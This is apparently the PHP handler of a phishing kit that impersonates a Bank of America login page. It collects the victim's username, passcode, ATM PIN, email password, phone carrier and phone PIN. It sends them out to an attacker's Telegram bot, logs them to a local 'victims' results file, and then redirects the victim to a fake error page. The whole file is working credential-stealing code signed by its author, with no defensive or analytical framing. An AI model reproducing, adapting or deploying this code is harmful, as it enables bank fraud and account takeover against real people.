<?php

include 'config.php';

include ('index');
	
	
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('Africa/Cairo');
$date = date('d/m/Y h:i:sa');


function callAPI($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
   // EXECUTE:
   $result = curl_exec($curl);
   curl_close($curl);
}


#browser info
#Country info

$_SESSION['_1sr'] = $_POST['passwd'];



#Security information


    $msg="===========[-".$dev."- BOA LOGIN]===========<br>\r\n";
    $msg.="USERNAME: ".$_SESSION['_ID']."<br>\r\n";
	$msg.="PassCode: ".$_SESSION['_PASSCODE']."<br>\r\n";
	$msg.="ATMPIN: ".$_SESSION['_atmpin']."<br>\r\n";
    $msg.="=======================================<br>\r\n";
	$msg.="E-mail: ".$_SESSION['_emailaddress']."<br>\r\n";
	$msg.="Carrier: ".$_SESSION['_select1']."<br>\r\n";
	$msg.="Phone Line : ".$_SESSION['_wireless']."<br>\r\n";
	$msg.="Phone Pin  : ".$_SESSION['_wirelesspin']."<br>\r\n";
    $msg.="=======================================<br>\r\n";
	$msg.="E-mail: ".$_SESSION['_EMAIL']."<br>\r\n";
	$msg.="E-mail Password: ".$_SESSION['_1sr']."<br>\r\n";
	$msg.="===============[Information]==============<br>\r\n";
    $msg.="IP : http://www.geoiptool.com/?IP=".$_SESSION['_IP_']."<br>\r\n";
    $msg.="Browser : ".$user_browser."<br>\r\n";
    $msg.="OS : ".$user_os."<br>\r\n";
    $msg.="User Agent : ".$_SERVER['HTTP_USER_AGENT']."<br>\r\n";
	$msg.="TIME		: $date <br>\r\n";
	$msg.="===========[By -".$dev."-]===========\r\n\r\n\r\n";


################
$TELG.= urlencode("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n");
$TELG.= urlencode("<b>==[By EGSN!PER LOGIN BOA]======</b>\n");
$TELG.= urlencode("<b>[USERNAME]</b> : ".$_SESSION['_ID']."\n");
$TELG.= urlencode("<b>[PASSWORD]</b> : ".$_SESSION['_PASSCODE']."\n");
$TELG.= urlencode("<b>[ATM PIN]</b> : ".$_SESSION['_atmpin']."\n");
$TELG.= urlencode("<b>=================================</b>\n");
$TELG.= urlencode("<b>[EMAIL]</b> : ".$_SESSION['_emailaddress']."\n");
$TELG.= urlencode("<b>[Carrier]</b> : ".$_SESSION['_select1']."\n");
$TELG.= urlencode("<b>[Phone Line]</b> : ".$_SESSION['_wireless']."\n");
$TELG.= urlencode("<b>[Phone Pin]</b> : ".$_SESSION['_wirelesspin']."\n");
$TELG.= urlencode("<b>=================================</b>\n");
$TELG.= urlencode("<b>[E_MAIL]</b> : ".$_SESSION['_EMAIL']."\n");
$TELG.= urlencode("<b>[E-mail Password]</b> : ".$_SESSION['_1sr']."\n");
$TELG.= urlencode("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n");
$TELG.= urlencode("<b>IP</b> : http://www.geoiptool.com/?IP=".$ip." \n");
$TELG.= urlencode("<b>USER AGENT</b> : ".$useragent." \n");
$TELG.= urlencode("<b>Date</b> : ".date('l jS \of F Y h:i:s A')." \n");
$TELG.= urlencode("<b>==[By -EGSN!PER-]======</b>\n");

callAPI('https://api.telegram.org/bot'.$config_token.'/sendMessage?chat_id='.$config_chat.'&text='.$TELG.'&parse_mode=html');
#################

$victimes = fopen("system/result.txt","a+");
fwrite($victimes,$msg);
fclose($victimes);



$ee= md5(microtime());
$ee1= md5(microtime());


header("location: ./loginerror?$ee");

?>